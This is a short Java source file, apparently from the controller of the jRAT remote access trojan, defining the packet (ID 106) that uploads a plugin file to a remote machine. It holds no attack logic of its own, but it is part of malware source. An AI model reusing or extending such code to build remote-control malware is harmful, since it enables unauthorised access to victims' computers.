package jrat.controller.packets.outgoing;

import jrat.controller.threads.ThreadUploadFile;

import java.io.File;

public class Packet106ServerUploadPlugin extends Packet42ServerUploadFile {

	public Packet106ServerUploadPlugin(File file, String remoteFile) {
		super(file, remoteFile, true);
	}
	
	public Packet106ServerUploadPlugin(File file, String remoteFile, ThreadUploadFile thread) {
		super(file, remoteFile, true, thread);
	}
	
	@Override
	public short getPacketId() {
		return 106;
	}

}
